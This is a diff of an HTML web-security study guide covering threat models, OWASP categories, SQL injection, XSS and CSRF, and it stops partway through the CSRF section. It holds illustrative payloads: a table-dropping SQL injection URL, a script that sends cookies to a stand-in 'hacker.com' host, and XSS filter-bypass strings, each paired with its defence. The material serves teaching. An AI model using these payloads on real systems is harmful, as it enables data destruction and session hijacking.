-<ul><li><strong>SQLi</strong> — SQL Injection</li><li><strong>XSS</strong> — Cross-Site Scripting</li><li><strong>CSRF</strong> — Cross-Site Request Forgery</li><li><strong>Auth</strong> — Authentication &amp; Sessions</li><li><strong>Config</strong> — Secure Configurations</li><li><strong>LFI/RFI</strong> — Local/Remote File Inclusion</li><li><strong>RCE</strong> — Remote Code Execution</li><li><strong>DDoS</strong> — Distributed Denial of Service</li></ul>
-<div class="callout why"><div class="callout-ico" aria-hidden="true">💡</div><div class="callout-body"><p class="callout-title">Why It Matters:</p><div class="callout-text">Knowing the standard catalogue means you can review any application against a known checklist rather than guessing where problems might be.</div></div></div></div></section>
-<section class="section" id="sec-5"><header class="section-head"><span class="section-num">05</span><h2>SQL Injection (SQLi)</h2></header><div class="section-body"><p><strong>SQL Injection</strong> arises from failing to properly sanitise user input before inserting it into a database string.</p>
-<p><strong>Root cause:</strong> untrusted user input is concatenated directly into a raw SQL query without parameterisation. This lets an attacker <strong>break out of the data context</strong> and change the query's syntax — and if the input can modify the query, it can be modified to run <em>any</em> database query. It is very common and can lead to complete compromise. Many automated tools both detect and exploit it.</p>
-<p><strong>Vulnerable PHP example:</strong></p>
-<div class="code"><button class="copy" type="button" data-copy>Copy</button><pre><code>// Get input
+<section class="guide-section" id="how-systems-get-hacked" data-title="How Systems Get Hacked">
+  <div class="section-head">
+    <span class="sec-num" aria-hidden="true"></span>
+    <h2 class="section-title">How Systems Get Hacked</h2>
+  </div>
+  <p class="section-kicker">Websites are not broken by exotic magic — they are broken by predictable design mistakes, and knowing the mistakes is the first defence.</p>
+<p>Most breaches trace back to a small set of design failures. System designers:</p>
+<ul><li>Protect the <strong>wrong things</strong>.</li><li>Protect the <strong>right things in the wrong way</strong>.</li><li>Make <strong>poor assumptions</strong> about their systems.</li><li>Fail to understand the <strong>threat model</strong> (who the attacker is and what they want).</li><li>Fail to account for <strong>paradigm shifts</strong> — for example, moving a system onto the Internet exposes it to a whole new population of attackers.</li><li>Fail to understand the <strong>scope</strong> of their system (where it starts and ends, and what it depends on).</li></ul>
+<div class="callout c-why"><div class="callout-icon" aria-hidden="true">💡</div><div class="callout-body"><strong>Why it matters:</strong> You cannot defend a system until you can name the threat model. "Make it secure" is meaningless without asking <em>secure against whom, doing what, and at what cost?</em></div></div>
+<p>As Michal Zalewski puts it in <em>The Tangled Web</em>, modern web applications are built on "a tangle of technologies that have been developed over time and then haphazardly pieced together." Every layer — from HTTP requests to browser-side scripts — carries important but subtle security consequences, and developers must navigate that landscape confidently to keep users safe.</p>
+<h3 class="sub-title">What does "getting hacked" actually mean?</h3>
+<p>There are two broad targets, and they lead to two families of attacks.</p>
+<div class="table-wrap"><table><thead><tr><th>Target</th><th>How the attack works</th><th>Example attacks</th></tr></thead><tbody><tr><td><strong>Servers</strong></td><td>Manipulate the <strong>server-side code</strong> running the site</td><td>SQL Injection, Remote Code Execution, Local/Remote File Inclusion</td></tr><tr><td><strong>Users</strong></td><td>Alter or intercept data on a <strong>user's computer</strong> while they use the site as intended</td><td>Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF)</td></tr></tbody></table></div>
+<div class="callout c-memory"><div class="callout-icon" aria-hidden="true">🧠</div><div class="callout-body"><strong>Memory hook:</strong> <em>Server-side attacks change the code; user-side attacks change the data the user's browser trusts.</em></div></div>
+<div class="reflect"><span class="ri" aria-hidden="true">🤔</span><div><strong>Pause &amp; predict:</strong> A blog shows each author's name next to their post. The name is stored exactly as the user typed it. Which family of attack (server-side or user-side) does this open up, and why?</div></div>
+</section>
+<section class="guide-section" id="what-can-be-hacked-and-the-axioms-of-security" data-title="What Can Be Hacked, and the Axioms of Security">
+  <div class="section-head">
+    <span class="sec-num" aria-hidden="true"></span>
+    <h2 class="section-title">What Can Be Hacked, and the Axioms of Security</h2>
+  </div>
+  <p class="section-kicker">Almost everything in a system is attackable — product, infrastructure, application, and above all the people — so security is a resource-allocation problem, not a solvable one.</p>
+<p>The attack surface of an organisation extends far beyond its web server. Each of the following is a potential target:</p>
+<ul><li>A <strong>product or component</strong> — e.g. a software program, a cryptographic protocol, a smart card.</li><li><strong>Infrastructure</strong> — e.g. a PC, an operating system, communications.</li><li><strong>Applications</strong> — e.g. a web server, a payroll system.</li><li><strong>IT staff</strong>.</li><li><strong>Users and management</strong>.</li><li><strong>Customers and external users</strong>.</li><li><strong>Partners and vendors</strong>.</li></ul>
+<h3 class="sub-title">Axioms of Information Security</h3>
+<p>These are the foundational truths that shape every security decision:</p>
+<ol><li>Information security is a <strong>resource game</strong> — you never have infinite budget.</li><li><strong>All systems are buggy.</strong></li><li>The bigger the system, the buggier it is.</li><li><strong>Nothing works in isolation</strong> — every dependency is an attack path.</li><li><strong>Humans are most often the weakest link</strong> in a system.</li><li>It's a lot easier to <strong>break</strong> a system than to make it secure.</li></ol>
+<div class="callout c-why"><div class="callout-icon" aria-hidden="true">💡</div><div class="callout-body"><strong>Why it matters:</strong> Because security is a resource game played against an adversary who only needs one hole, perfect security is impossible. The goal is to make the cost of attack exceed its value while protecting the things that matter most.</div></div>
+</section>
+<section class="guide-section" id="focusing-on-the-important-risks" data-title="Focusing on the Important Risks">
+  <div class="section-head">
+    <span class="sec-num" aria-hidden="true"></span>
+    <h2 class="section-title">Focusing on the Important Risks</h2>
+  </div>
+  <p class="section-kicker">Not all risks deserve equal attention — you rank them so scarce security effort goes where the damage would be worst.</p>
+<p>Risks are graded on a seven-level severity scale, each level carrying a different management response:</p>
+<div class="table-wrap"><table><thead><tr><th>Level</th><th>What it means</th><th>Who manages it</th></tr></thead><tbody><tr><td>1. Severe</td><td>Must be managed by senior management with a detailed plan</td><td>Senior management</td></tr><tr><td>2. High</td><td>Detailed research and management required</td><td>Senior levels</td></tr><tr><td>3. Major</td><td>Senior management attention needed</td><td>Senior management</td></tr><tr><td>4. Significant</td><td>Management responsibility must be specified</td><td>Named manager</td></tr><tr><td>5. Moderate</td><td>Managed by specific monitoring or response procedures</td><td>Procedures</td></tr><tr><td>6. Low</td><td>Managed by routine procedures</td><td>Routine</td></tr><tr><td>7. Trivial</td><td>Unlikely to need specific application of resources</td><td>None specific</td></tr></tbody></table></div>
+<p>To place a risk on this scale you weigh three competing factors:</p>
+<ul><li>The <strong>likelihood</strong> of the component being exploited.</li><li>The <strong>damage</strong> if it is exploited.</li><li>The <strong>mitigation cost</strong> to prevent exploitation.</li></ul>
+<div class="callout c-tip"><div class="callout-icon" aria-hidden="true">✅</div><div class="callout-body"><strong>Exam tip:</strong> A "Severe" risk is not simply the most likely — it is the combination of high likelihood, high damage, and a management response proportionate to a detailed plan. Be ready to justify a ranking using all three factors.</div></div>
+</section>
+<section class="guide-section" id="security-resources-and-the-rules-of-engagement" data-title="Security Resources and the Rules of Engagement">
+  <div class="section-head">
+    <span class="sec-num" aria-hidden="true"></span>
+    <h2 class="section-title">Security Resources and the Rules of Engagement</h2>
+  </div>
+  <p class="section-kicker">Learn from the community's shared databases and labs — but only ever test systems you have explicit permission to test.</p>
+<h3 class="sub-title">Where the knowledge lives</h3>
+<ul><li><strong>OWASP</strong> — the Open Web Application Security Project. It aims to provide comprehensive assessment and education about web vulnerabilities (its "Top 10" is the canonical list).</li><li><strong>CVE</strong> — the Common Vulnerabilities and Exposures system, a catalogue of publicly known breaches and data leaks. It tracks <strong>over 160,000</strong> incidents.</li><li><strong>DVWA</strong> — Damn Vulnerable Web Application, a deliberately simple web app that demonstrates basic web vulnerabilities for practice.</li><li><strong>PentesterLab</strong> — practical tutorials and exercises to learn hacking and penetration-testing skills, including exploitation of web vulnerabilities.</li></ul>
+<p>Related study at Sydney: <strong>ELEC5616 Computer &amp; Network Security</strong> (Semester 1).</p>
+<h3 class="sub-title">Ask for permission — always</h3>
+<ul><li>The <strong>only</strong> context in which these techniques are legal is when they have been <strong>explicitly permitted</strong> by the owners and administrators of the networks or applications you are testing.</li><li>A sound knowledge of these tools opens doors to commercial opportunities and a rewarding career — don't throw it away doing something stupid.</li></ul>
+<h3 class="sub-title">Cloud-specific warning</h3>
+<p>Cloud providers can prohibit certain security tools, especially those that <strong>scan network port ranges</strong> or send <strong>malicious/malformed traffic</strong>. This restriction can usually be waived by submitting a <strong>request to scan ahead of time</strong>.</p>
+<div class="callout c-warn"><div class="callout-icon" aria-hidden="true">⚠️</div><div class="callout-body"><strong>Common trap:</strong> "It's just a test" is not a legal defence. Unauthorised scanning or exploitation — even on a cloud VM you rent — can breach provider terms and the law. Get written permission first.</div></div>
+</section>
+<section class="guide-section" id="the-owasp-top-10-landscape" data-title="The OWASP Top 10 Landscape">
+  <div class="section-head">
+    <span class="sec-num" aria-hidden="true"></span>
+    <h2 class="section-title">The OWASP Top 10 Landscape</h2>
+  </div>
+  <p class="section-kicker">The OWASP Top 10 is the map of the most widespread web vulnerabilities; this week walks through the most important of them.</p>
+<p>The <strong>OWASP Top 10</strong> project identifies the most widespread vulnerabilities on the internet. This week covers the following (there are many more):</p>
+<div class="table-wrap"><table><thead><tr><th>Short name</th><th>Full name</th></tr></thead><tbody><tr><td>SQLi</td><td>SQL Injection</td></tr><tr><td>XSS</td><td>Cross-Site Scripting</td></tr><tr><td>CSRF</td><td>Cross-Site Request Forgery</td></tr><tr><td>Auth</td><td>Authentication &amp; Sessions</td></tr><tr><td>Config</td><td>Secure Configurations</td></tr><tr><td>LFI/RFI</td><td>Local/Remote File Inclusion</td></tr><tr><td>RCE</td><td>Remote Code Execution</td></tr><tr><td>DDoS</td><td>Distributed Denial of Service</td></tr></tbody></table></div>
+<div class="callout c-memory"><div class="callout-icon" aria-hidden="true">🧠</div><div class="callout-body"><strong>Memory hook:</strong> Group them by target — <strong>server-side:</strong> SQLi, RCE, LFI/RFI, Config; <strong>user-side:</strong> XSS, CSRF; <strong>cross-cutting:</strong> Auth, DDoS.</div></div>
+<div class="reflect"><span class="ri" aria-hidden="true">🤔</span><div><strong>Pause &amp; predict:</strong> Before reading on, guess for each vulnerability what untrusted input it exploits. Then check your guesses against the sections that follow.</div></div>
+</section>
+<section class="guide-section" id="sql-injection-sqli" data-title="SQL Injection (SQLi)">
+  <div class="section-head">
+    <span class="sec-num" aria-hidden="true"></span>
+    <h2 class="section-title">SQL Injection (SQLi)</h2>
+  </div>
+  <p class="section-kicker">SQL injection happens when user input is pasted straight into a database query, letting an attacker rewrite the query itself.</p>
+<p><strong>SQL Injection arises from failing to properly sanitise user input before inserting it into a database string.</strong> The key insight: if input can modify an SQL query, then it is possible to modify that query to do <em>any</em> database query. It is very common, can lead to complete compromise, and has many automated tools both to detect it and to exploit it automatically.</p>
+<h3 class="sub-title">The vulnerable code</h3>
+<div class="code-block"><button class="code-copy" type="button">Copy</button><pre><code>// Get input
 $id = $_REQUEST[&#x27;id&#x27;];
 // Check database
 $query = &quot;SELECT first_name, last_name FROM users
 WHERE user_id = &#x27;$id&#x27;;&quot;;
-$result = mysql_query($query);</code></pre></div>
-<p><strong>Normal request:</strong></p>
-<div class="code"><button class="copy" type="button" data-copy>Copy</button><pre><code>http://example.com/?id=15</code></pre></div>
-<p>Executes: <code>SELECT first_name, last_name FROM users WHERE user_id = '15';</code> — behaves normally.</p>
-<p><strong>Malicious request:</strong></p>
-<div class="code"><button class="copy" type="button" data-copy>Copy</button><pre><code>http://example.com/?id=%27%3B+DROP+TABLE+users%3B+--</code></pre></div>
-<p>Decodes to <code>'; DROP TABLE users; --</code>, producing:</p>
-<div class="code"><button class="copy" type="button" data-copy>Copy</button><pre><code>SELECT first_name, last_name FROM users WHERE user_id = &#x27;&#x27;; DROP TABLE users; --&#x27;;</code></pre></div>
-<p>How it works step by step:</p>
-<ul><li><code>'</code> closes the single quote around <code>user_id</code>.</li><li><code>;</code> terminates the first <code>SELECT</code> statement.</li><li><code>DROP TABLE users;</code> runs an arbitrary database command.</li><li><code>--</code> comments out the trailing quote so the query stays syntactically valid.</li></ul>
-<p><strong>Automation:</strong> <strong>sqlmap</strong> is a fully open-source Python program that automates most of the hard work of SQLi — detecting the flaw and dumping databases, extracting passwords, and even gaining OS shell access.</p>
-<p><strong>Defence:</strong></p>
-<ul><li><strong>Parameterised queries / prepared statements</strong> — keep user data separate from SQL command logic; the driver treats input strictly as literal values, never executable code.</li><li><strong>Use an ORM</strong> (Object-Relational Mapper) such as Sequelize, Django ORM, or SQLAlchemy, which uses parameterised queries under the hood.</li></ul>
-<p>Flow from flaw to compromise:</p>
-<div class="flow"><div class="flow-step"><span class="flow-n">01</span><span>Untrusted input</span></div><span class="flow-arrow" aria-hidden="true">→</span><div class="flow-step"><span class="flow-n">02</span><span>String concatenation</span></div><span class="flow-arrow" aria-hidden="true">→</span><div class="flow-step"><span class="flow-n">03</span><span>Malicious SQL</span></div><span class="flow-arrow" aria-hidden="true">→</span><div class="flow-step"><span class="flow-n">04</span><span>Database executes</span></div><span class="flow-arrow" aria-hidden="true">→</span><div class="flow-step"><span class="flow-n">05</span><span>Total data compromise</span></div></div>
-<div class="callout memory"><div class="callout-ico" aria-hidden="true">🧠</div><div class="callout-body"><p class="callout-title">Memory Hook:</p><div class="callout-text">SQLi = <strong>"Data becomes code."</strong> The fix is parameterisation so data can <em>never</em> become code.</div></div></div></div></section>
-<section class="section" id="sec-6"><header class="section-head"><span class="section-num">06</span><h2>Cross-Site Scripting (XSS)</h2></header><div class="section-body"><p><strong>Cross-Site Scripting</strong> arises when an attacker can inject <strong>HTML (and therefore JavaScript)</strong> into a website. Remember that HTML tells the browser how to display a page, and it can embed JavaScript.</p>
-<p><strong>The vulnerable template:</strong> A page inserts a user's name:</p>
-<div class="code"><button class="copy" type="button" data-copy>Copy</button><pre><code>&lt;H1&gt;Hello {% user.name %}&lt;/H1&gt;</code></pre></div>
-<p>This is fine for normal names, but what if the user's name is:</p>
-<div class="code"><button class="copy" type="button" data-copy>Copy</button><pre><code>&lt;script&gt;alert(&quot;LOL&quot;);&lt;/script&gt;</code></pre></div>
+$result = mysql_query($query)
+// Get results
+$row = mysqli_fetch_assoc($result);
+// Get values
+$first = $row[&quot;first_name&quot;];
+$last  = $row[&quot;last_name&quot;];
+// Feedback for end user
+$html .= &quot;&lt;p&gt;First name: {$first} Surname: {$last}&lt;/p&gt;&quot;;</code></pre></div>
+<p>The <code>$id</code> value is concatenated directly between two quotes inside the query string, so anything the attacker supplies becomes part of the SQL.</p>
+<h3 class="sub-title">Normal use vs attack</h3>
+<p>A benign request returns the expected user:</p>
+<div class="code-block"><button class="code-copy" type="button">Copy</button><pre><code>http://example.com/?id=15</code></pre></div>
+<p>The injected request below uses URL encoding (<code>%27</code> = <code>&#x27;</code>, <code>%3B</code> = <code>;</code>, <code>+</code> = space):</p>
+<div class="code-block"><button class="code-copy" type="button">Copy</button><pre><code>http://example.com/?id=%27%3B+DROP+TABLE+users%3B+--</code></pre></div>
+<p>The database now executes <strong>two</strong> statements — the original SELECT, then a destructive one, with the trailing <code>--</code> commenting out the rest:</p>
+<div class="code-block"><button class="code-copy" type="button">Copy</button><pre><code>SELECT first_name, last_name FROM users WHERE user_id = &#x27;&#x27;;
+DROP TABLE users; --&#x27;;</code></pre></div>
+<h3 class="sub-title">Defence</h3>
+<ul><li><strong>Using an ORM or a database library</strong> (with parameterised queries) defends against this, because the input is treated as data, never as query structure.</li></ul>
+<h3 class="sub-title">The automated tool: sqlmap</h3>
+<p>Performing an SQL injection has now been automated. <strong>sqlmap</strong> is a fully open-source (Python) program that automates most of the hard work of SQLi.</p>
+<div class="callout c-warn"><div class="callout-icon" aria-hidden="true">⚠️</div><div class="callout-body"><strong>Common trap:</strong> "Sanitising" by escaping quotes by hand is fragile. The robust fix is to separate code from data with parameterised queries or an ORM — never string-concatenate input into a query.</div></div>
+</section>
+<section class="guide-section" id="cross-site-scripting-xss" data-title="Cross-Site Scripting (XSS)">
+  <div class="section-head">
+    <span class="sec-num" aria-hidden="true"></span>
+    <h2 class="section-title">Cross-Site Scripting (XSS)</h2>
+  </div>
+  <p class="section-kicker">XSS happens when an attacker injects HTML (and therefore JavaScript) into a page, so the victim's own browser executes the attacker's code.</p>
+<p><strong>Cross-Site Scripting arises when an attacker is able to inject HTML into the website.</strong> This matters because HTML tells the browser how to display a webpage and can incorporate JavaScript — so injected HTML can carry executable code.</p>
+<h3 class="sub-title">The vulnerable template</h3>
+<p>Suppose the page inserts the user's name into a heading:</p>
+<div class="code-block"><button class="code-copy" type="button">Copy</button><pre><code>&lt;H1&gt;Hello {% user.name %}&lt;/H1&gt;</code></pre></div>
+<p>This works for normal users. But imagine a user whose name is:</p>
+<div class="code-block"><button class="code-copy" type="button">Copy</button><pre><code>&lt;script&gt;alert(&quot;LOL&quot;);&lt;/script&gt;</code></pre></div>
 <p>The page then renders:</p>
-<div class="code"><button class="copy" type="button" data-copy>Copy</button><pre><code>&lt;H1&gt;Hello &lt;script&gt;alert(&quot;LOL&quot;);&lt;/script&gt;&lt;/H1&gt;</code></pre></div>
-<p>Now an alert fires when that user loads the page. An alert alone is harmless, but if the snippet runs on a <strong>public page</strong> (a user list, or a blog post showing an author's name) and is more malicious, "the effects can be devastating."</p>
-<div class="callout why"><div class="callout-ico" aria-hidden="true">💡</div><div class="callout-body"><p class="callout-title">Why It Matters:</p><div class="callout-text">If a hacker can execute JavaScript in your browser, they can <strong>steal your cookies</strong>. Injected script such as:</div></div></div>
-<div class="code"><button class="copy" type="button" data-copy>Copy</button><pre><code>document.write(&#x27;&lt;img src=&quot;http://hacker.com/collect.php?cookie=&#x27; + document.cookie + &#x27;&quot; /&gt;&#x27;)</code></pre></div>
-<p>sends every victim's cookie to the attacker's server. With that cookie the hacker can <strong>authenticate as that user</strong> and hijack the session.</p>
-<p><strong>Preventing XSS — the wrong way:</strong> <em>Stripping all <code>&lt;script&gt;</code> tags</em> is WRONG. It is easily bypassed:</p>
-<ul><li><strong>Nested evasion:</strong> <code>&lt;s&lt;script&gt;cript&gt;...&lt;/script&gt;</code> — removing the inner <code>&lt;script&gt;</code> collapses into <code>&lt;script&gt;...&lt;/script&gt;</code>.</li><li><strong>Event handlers / other tags:</strong> <code>&lt;img src="img.jpg" onerror="alert(1)" /&gt;</code> executes JavaScript with no <code>&lt;script&gt;</code> tag at all.</li><li>There are many ways to perform XSS, and it is <strong>impossible to recognise them all</strong>.</li></ul>
-<p><strong>Preventing XSS — the right way:</strong> <strong>HTML escaping</strong> via your templating library:</p>
-<ol><li>User input is stored in the database <strong>as-is</strong>, even if it contains HTML tags.</li><li>Upon displaying any data, it is <strong>HTML-escaped by default</strong>.</li></ol>
-<p>Escaping replaces dangerous characters:</p>
-<ul><li><code>&lt;</code> becomes <code>&amp;lt;</code></li><li><code>&gt;</code> becomes <code>&amp;gt;</code></li><li><code>"</code> becomes <code>&amp;quot;</code></li><li><code>'</code> becomes <code>&amp;#x27;</code></li><li><code>&amp;</code> becomes <code>&amp;amp;</code></li></ul>
-<p>So the malicious name renders as:</p>
-<div class="code"><button class="copy" type="button" data-copy>Copy</button><pre><code>&lt;H1&gt;Hello &amp;lt;script&amp;gt;alert(&amp;quot;LOL&amp;quot;);&amp;lt;/script&amp;gt;&lt;/H1&gt;</code></pre></div>
-<p>The browser now displays the literal text <code>&lt;script&gt;alert("LOL");&lt;/script&gt;</code> on screen instead of executing it.</p>
-<div class="callout warn"><div class="callout-ico" aria-hidden="true">⚠️</div><div class="callout-body"><p class="callout-title">Common Trap:</p><div class="callout-text">Escaping only works if you escape on <strong>output</strong> in the correct context. Storing raw data is fine; rendering it unescaped is the bug.</div></div></div></div></section>
-<section class="section" id="sec-7"><header class="section-head"><span class="section-num">07</span><h2>Cross-Site Request Forgery (CSRF)</h2></header><div class="section-body"><p><strong>Cross-Site Request Forgery (CSRF)</strong> is an exploit against a website that arises when <strong>only the browser is authenticated</strong> (e.g. via a cookie) but the <strong>user's request is not properly authenticated</strong>.</p>
-<p><strong>Attack flow:</strong></p>
-<ol><li>User logs into <code>bank.com</code> — a session cookie is stored in the browser.</li><li>User visits a malicious site, <code>attacker.com</code>.</li><li><code>attacker.com</code> contains a hidden form submitting to <code>bank.com/transfer?to=hacker&amp;amount=1000</code>.</li><li>The user's browser executes the request, <strong>automatically attaching</strong> <code>bank.com</code> session cookies.</li><li><code>bank.com</code> processes the transfer, believing it came legitimately from the user.</li></ol>
-<p><strong>Preventing CSRF:</strong> include a <strong>CSRF token</strong> on requests that change data (e.g. POST, but not GET).</p>
-<ul><li>The site uses JavaScript to submit a special token, taken from a cookie, as one of the POST variables — a token only it has access to.</li><li>The token typically appears somewhere in the HTML or in the cookies.</li><li>The server checks that the submitted token matches the token bound to the user's session; because <code>attacker.com</code> cannot read the victim's token (the <strong>Same-Origin Policy</strong> blocks it), forged requests are rejected.</li></ul>
-<div class="callout warn"><div class="callout-ico" aria-hidden="true">⚠️</div><div class="callout-body"><p class="callout-title">Common Trap:</p><div class="callout-text"><strong>Checking for the mere presence of a CSRF token in a cookie is not enough</strong> — the browser sends cookies automatically, so a forged request would carry it. The token <strong>must be included as a variable</strong> (in the request body/header) to authenticate the request.</div></div></div></div></section>
-<section class="section" id="sec-8"><header class="section-head"><span class="section-num">08</span><h2>Authentication &amp; Password Storage</h2></header><div class="section-body"><p><strong>Authentication has two stages:</strong></p>
-<ol><li><strong>Logging in</strong> — proving identity, e.g. username and password.</li><li><strong>Identifying the logged-in session</strong> — maintaining state across later requests, e.g. via cookies.</li></ol>
-<p><strong>The login flow:</strong></p>
-<ol><li>The user sees a login form and provides a username and password.</li><li>The server <strong>hashes</strong> the password and compares the computed hash with its stored password hash for that user.</li><li>If the hashes match, the user is authenticated and the server responds with an <strong>authentication cookie/token</strong>.</li></ol>
-<p><strong>Password storage:</strong> If passwords were stored in the database as <strong>plaintext</strong>, an attacker who gains access to the database could authenticate as anyone. Therefore we store <strong>password hashes</strong> — so a breach does not hand over usable passwords. To use stolen hashes, an attacker would need to <strong>reverse the hash</strong> to recover the original passwords.</p>
-<div class="callout why"><div class="callout-ico" aria-hidden="true">💡</div><div class="callout-body"><p class="callout-title">Why It Matters:</p><div class="callout-text">A database leak should be a bad day, not a total account takeover. Hashing is what turns stolen credential rows into useless noise.</div></div></div></div></section>
-<section class="section" id="sec-9"><header class="section-head"><span class="section-num">09</span><h2>Hashing, Cracking &amp; Salting</h2></header><div class="section-body"><p><strong>Hash functions</strong> map an input string to an output hash. Desirable properties:</p>
-<ul><li><strong>One way (pre-image resistance)</strong> — given a hash, the original string cannot be computed.</li><li><strong>Unpredictable (avalanche effect)</strong> — you cannot choose an input to get a particular output hash; tiny input changes give completely different outputs.</li><li><strong>Non-collision (collision resistance)</strong> — you cannot find two different inputs that map to the same output hash.</li></ul>
-<p><strong>Cracking passwords:</strong> An attacker with stolen hashes can compute the hash of every possible password and match it to the hash list. This works because passwords are hard to invent and remember — most human passwords are in a dictionary, either as a word or a concatenation of words.</p>
-<p><strong>Rainbow tables</strong> are a major extension of this attack: precomputed lookup tables of commonly used passwords (e.g. <code>password1</code>, <code>ilikecats123</code>) and common word variations, used to supplement dictionary attacks. These attacks won't work on every user (a unique gibberish password survives), but they have been shown to work on <strong>large portions of leaked password hash sets</strong>.</p>
-<p><strong>Salting</strong> mitigates dictionary attacks without forcing stricter password rules on users:</p>
-<ul><li>Before hashing, the raw password is <strong>concatenated with another string called the salt</strong>.</li><li><strong>Stored Hash</strong> <code>Hash(Password + Salt)</code></li><li>Salts are usually stored in <strong>plaintext</strong> in the database, right next to the password hashes.</li><li><strong>A different salt is used for each user</strong>, for further security.</li><li>This <strong>thwarts dictionary attacks that rely on massive precomputation</strong> (rainbow tables), because the unique salt changes the hash for every user — attackers must recompute dictionary hashes individually per account, vastly increasing cost.</li><li>⚠️ Once the salt is known, however, brute-force dictionary attacks may still be run. Salting raises the cost; it does not make a weak password strong.</li></ul>
-<div class="callout memory"><div class="callout-ico" aria-hidden="true">🧠</div><div class="callout-body"><p class="callout-title">Memory Hook:</p><div class="callout-text">Password defence ladder: <strong>Plaintext (worst) → Hash (better) → Hash + per-user Salt (best of these).</strong></div></div></div></div></section>
-<section class="section" id="sec-10"><header class="section-head"><span class="section-num">10</span><h2>Auth Tokens &amp; Cookie Security</h2></header><div class="section-body"><p>After authentication, the server provides an <strong>auth token</strong>, delivered in the cookies. There are <strong>two main ways</strong> to manage that token:</p>
-<div class="table-wrap"><table><thead><tr><th>Approach</th><th>How it works</th><th>Trade-off</th></tr></thead><tbody><tr><td><strong>Stateful</strong></td><td>Store valid tokens and expiry in a database (e.g. Redis)</td><td>Obvious and simple, but uses memory/storage and a lookup per request</td></tr><tr><td><strong>Stateless (calculated)</strong></td><td>Compute valid tokens from a hash of details and a secret</td><td>No token storage, but CPU cost to recompute each request</td></tr></tbody></table></div>
-<p><strong>Calculated authentication tokens</strong> let the server check authentication <strong>without storing tokens</strong>. It computes a value that can be recomputed after every request, then checks whether the provided token matches the calculated one. This adds <strong>computational overhead</strong> (recomputed every request) but <strong>reduces memory overhead</strong>.</p>
-<p>A sample Python implementation:</p>
-<div class="code"><button class="copy" type="button" data-copy>Copy</button><pre><code>def build_auth_token(self):
+<div class="code-block"><button class="code-copy" type="button">Copy</button><pre><code>&lt;H1&gt;Hello &lt;script&gt;alert(&quot;LOL&quot;);&lt;/script&gt;&lt;/H1&gt;</code></pre></div>
+<p>and an alert fires when that user loads the page. On its own this is minor, but if the snippet runs on a <strong>public page</strong> (a user list, or a blog post showing an author's name) and is more malicious than a simple alert, the effects can be <strong>devastating</strong>.</p>
+<h3 class="sub-title">Why JavaScript in your browser is dangerous: cookie theft</h3>
+<p>What's the problem with a hacker executing JavaScript in your browser? <strong>They can steal your cookies.</strong> Consider this injected script:</p>
+<div class="code-block"><button class="code-copy" type="button">Copy</button><pre><code>document.write(&#x27;&lt;img src=&quot;http://hacker.com/collect.php?cookie=&#x27;
+  + document.cookie + &#x27;&quot; /&gt;&#x27;)</code></pre></div>
+<p>Every user who loads the page silently sends their cookie to the attacker's server. With a victim's cookie the attacker can <strong>authenticate as that user</strong>.</p>
+<div class="callout c-why"><div class="callout-icon" aria-hidden="true">💡</div><div class="callout-body"><strong>Why it matters:</strong> The session cookie <em>is</em> the logged-in identity. Stealing it is equivalent to stealing the account — no password needed.</div></div>
+<div class="reflect"><span class="ri" aria-hidden="true">🤔</span><div><strong>Pause &amp; predict:</strong> A site reflects your search term back into the page inside a <code>&lt;div&gt;</code>. Is this vulnerable to XSS, and what single change to the output step would fix it?</div></div>
+</section>
+<section class="guide-section" id="preventing-xss" data-title="Preventing XSS">
+  <div class="section-head">
+    <span class="sec-num" aria-hidden="true"></span>
+    <h2 class="section-title">Preventing XSS</h2>
+  </div>
+  <p class="section-kicker">You cannot reliably blacklist bad HTML — the correct defence is to HTML-escape all output so it is displayed, never interpreted.</p>
+<h3 class="sub-title">Why stripping <code>&lt;script&gt;</code> tags is wrong</h3>
+<p>A tempting fix is to strip all <code>&lt;script&gt;</code> tags from user input. <strong>This is wrong</strong>, for a subtle reason. Consider the input:</p>
+<div class="code-block"><button class="code-copy" type="button">Copy</button><pre><code>&lt;s&lt;script&gt;cript&gt;…&lt;/script&gt;</code></pre></div>
+<p>If you strip the inner <code>&lt;script&gt;…&lt;/script&gt;</code>, the surrounding text closes back up into:</p>
+<div class="code-block"><button class="code-copy" type="button">Copy</button><pre><code>&lt;script&gt;…&lt;/script&gt;</code></pre></div>
+<p>— a working script tag you just created. There are <em>many, many</em> ways to perform XSS and it is impossible to recognise them all. Tags other than <code>&lt;script&gt;</code> work too:</p>
+<div class="code-block"><button class="code-copy" type="button">Copy</button><pre><code>&lt;img src=&quot;img.jpg&quot; onerror=&quot;alert(1)&quot; /&gt;</code></pre></div>
+<p>No <code>&lt;script&gt;</code> appears, yet JavaScript still runs via the <code>onerror</code> handler.</p>
+<h3 class="sub-title">The correct defence: HTML escaping via the templating library</h3>
+<ol><li><strong>User input is stored in the database as-is</strong>, even if it includes HTML tags.</li><li><strong>Upon displaying any data, it is HTML escaped by default.</strong></li></ol>
+<p>For the earlier malicious name <code>&lt;script&gt;alert(&quot;LOL&quot;);&lt;/script&gt;</code>, HTML escaping produces:</p>
+<div class="code-block"><button class="code-copy" type="button">Copy</button><pre><code>&lt;H1&gt;Hello &amp;lt;script&amp;gt;alert(&amp;quot;LOL&amp;quot;);&amp;lt;/script&amp;gt;&lt;/H1&gt;</code></pre></div>
+<p>This <strong>prints the HTML to the screen</strong> as visible text — it is <em>not</em> interpreted as HTML and not rendered by the browser.</p>
+<div class="callout c-memory"><div class="callout-icon" aria-hidden="true">🧠</div><div class="callout-body"><strong>Memory hook:</strong> <em>Escape on output, not input.</em> Store the raw data; escape the moment you render it. Blacklists lose; escaping wins.</div></div>
+</section>
+<section class="guide-section" id="cross-site-request-forgery-csrf" data-title="Cross-Site Request Forgery (CSRF)">
+  <div class="section-head">
+    <span class="sec-num" aria-hidden="true"></span>
+    <h2 class="section-title">Cross-Site Request Forgery (CSRF)</h2>
+  </div>
+  <p class="section-kicker">CSRF exploits a site that authenticates the browser (via a cookie) but never authenticates the user's actual request.</p>
+<p><strong>Cross-Site Request Forgery (CSRF) is a type of exploit against a website.</strong> It arises when <strong>only the browser is authenticated</strong> (e.g. via a cookie), but the <strong>user's request is not properly authenticated</strong>. The browser automatically attaches the victim's cookie to any request to the site — including requests the victim never intended to make.</p>
+<h3 class="sub-title">Preventing CSRF</h3>
+<p>The standard defence is a <strong>CSRF token</strong> included when making requests that change data:</p>
